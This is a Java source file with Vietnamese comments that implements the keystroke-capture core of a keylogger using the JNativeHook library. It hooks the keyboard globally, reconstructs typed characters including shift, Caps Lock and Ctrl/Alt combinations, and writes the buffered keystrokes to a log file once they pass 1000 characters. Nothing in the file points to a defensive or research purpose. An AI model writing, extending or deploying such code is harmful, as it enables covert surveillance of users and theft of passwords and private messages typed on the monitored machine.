import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

class KeyListenerHandler implements NativeKeyListener {
    private final StringBuilder keyBuffer = new StringBuilder(); // Bộ đệm lưu các phím nhấn
    private boolean shiftPressed = false; // Kiểm tra phím Shift
    private boolean capsLockEnabled = false; // Kiểm tra Caps Lock
    private boolean ctrlPressed = false; // Kiểm tra phím Ctr
    private boolean altPressed = false; // Kiểm tra phím Alt

    public String flushKeyBuffer() {
        String keys = keyBuffer.toString();
        keyBuffer.setLength(0);
        return keys;
    }

    public void appendToBuffer(String text) {
        keyBuffer.append(text);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        int keyCode = e.getKeyCode();
        if (keyCode == NativeKeyEvent.VC_SHIFT) {
            shiftPressed = true;
        } else if (keyCode == NativeKeyEvent.VC_CAPS_LOCK) {
            capsLockEnabled = !capsLockEnabled;
        } else if (keyCode == NativeKeyEvent.VC_CONTROL) {
            ctrlPressed = true;
        } else if (keyCode == NativeKeyEvent.VC_ALT) {
            altPressed = true;
        }
        if (ctrlPressed) {
            switch (keyCode) {
                case NativeKeyEvent.VC_C:
                    keyBuffer.append("[Ctrl+C]");
                    break;
                case NativeKeyEvent.VC_V:
                    keyBuffer.append("[Ctrl+V]");
                    break;
                case NativeKeyEvent.VC_F:
                    keyBuffer.append("[Ctrl+F]");
                    break;
                case NativeKeyEvent.VC_S:
                    keyBuffer.append("[Ctrl+S]");
                    break;
                case NativeKeyEvent.VC_X:
                    keyBuffer.append("[Ctrl+X]");
                    break;
            }
        } else if (altPressed) {
            switch (keyCode) {
                case NativeKeyEvent.VC_TAB:
                    keyBuffer.append("[Alt+Tab]");
                    break;
                case NativeKeyEvent.VC_F4:
                    keyBuffer.append("[Alt+F4");
                    break;
            }
        } else {
            switch (keyCode) {
                case NativeKeyEvent.VC_BACKSPACE:
                    keyBuffer.append("[Backspace]");
                    break;
                case NativeKeyEvent.VC_DELETE:
                    keyBuffer.append("[Delete]");
                    break;
                case NativeKeyEvent.VC_ENTER:
                    keyBuffer.append("[Enter]");
                    break;
                case NativeKeyEvent.VC_TAB:
                    keyBuffer.append("[Tab]");
                    break;
                case NativeKeyEvent.VC_META:
                    keyBuffer.append("[Win]");
                    break;
                case NativeKeyEvent.VC_LEFT:
                    keyBuffer.append("[Left]");
                    break;
                case NativeKeyEvent.VC_RIGHT:
                    keyBuffer.append("[Right]");
                    break;
                case NativeKeyEvent.VC_UP:
                    keyBuffer.append("[Up]");
                    break;
                case NativeKeyEvent.VC_DOWN:
                    keyBuffer.append("[Down]");
                    break;
                case NativeKeyEvent.VC_MINUS:
                    keyBuffer.append(shiftPressed ? '_' : '-');
                    break;
                case NativeKeyEvent.VC_EQUALS:
                    keyBuffer.append(shiftPressed ? '+' : '=');
                    break;
                case NativeKeyEvent.VC_OPEN_BRACKET:
                    keyBuffer.append(shiftPressed ? '{' : '[');
                    break;
                case NativeKeyEvent.VC_CLOSE_BRACKET:
                    keyBuffer.append(shiftPressed ? '}' : ']');
                    break;
                case NativeKeyEvent.VC_BACK_SLASH:
                    keyBuffer.append(shiftPressed ? '|' : '\\');
                    break;
                case NativeKeyEvent.VC_SEMICOLON:
                    keyBuffer.append(shiftPressed ? ':' : ';');
                    break;
                case NativeKeyEvent.VC_QUOTE:
                    keyBuffer.append(shiftPressed ? '"' : '\'');
                    break;
                case NativeKeyEvent.VC_COMMA:
                    keyBuffer.append(shiftPressed ? '<' : ',');
                    break;
                case NativeKeyEvent.VC_PERIOD:
                    keyBuffer.append(shiftPressed ? '>' : '.');
                    break;
                case NativeKeyEvent.VC_SLASH:
                    keyBuffer.append(shiftPressed ? '?' : '/');
                    break;
                case NativeKeyEvent.VC_BACKQUOTE:
                    keyBuffer.append(shiftPressed ? '~' : '`');
                    break;
                default:
                    processKeyCharacter(keyCode);
                    break;
            }
        }
        if (keyBuffer.length() > 1000) {
            LogFileHandler.writeToFile(flushKeyBuffer());
        }
    }

    private void processKeyCharacter(int keyCode) {
        String keyText = NativeKeyEvent.getKeyText(keyCode);
        if (keyText.length() == 1) { // Xử lý chỉ với ký tự đơn
            char keyChar = keyText.charAt(0);
            if (Character.isLetter(keyChar)) {
                if ((shiftPressed && !capsLockEnabled)
                        || (!shiftPressed && capsLockEnabled)) {
                    keyChar = Character.toUpperCase(keyChar);
                } else {
                    keyChar = Character.toLowerCase(keyChar);
                }
            } else if (shiftPressed) {
                keyChar = mapSpecialCharacterWithShift(keyChar);
            }
            keyBuffer.append(keyChar); // Chèn ký tự vào bộ đệm
        } else if (keyCode == NativeKeyEvent.VC_SPACE) {
            keyBuffer.append(' '); // Chèn dấu cách
        }
    }

    private char mapSpecialCharacterWithShift(char keyChar) {
        switch (keyChar) {
            case '1': return '!';
            case '2': return '@';
            case '3': return '#';
            case '4': return '$';
            case '5': return '%';
            case '6': return '^';
            case '7': return '&';
            case '8': return '*';
            case '9': return '(';
            case '0': return ')';
            default: return 0;
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        int keyCode = e.getKeyCode();
        if (keyCode == NativeKeyEvent.VC_SHIFT) {
            shiftPressed = false;
        } else if (keyCode == NativeKeyEvent.VC_CONTROL) {
            ctrlPressed = false;
        } else if (keyCode == NativeKeyEvent.VC_ALT) {
            altPressed = false;
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {}
}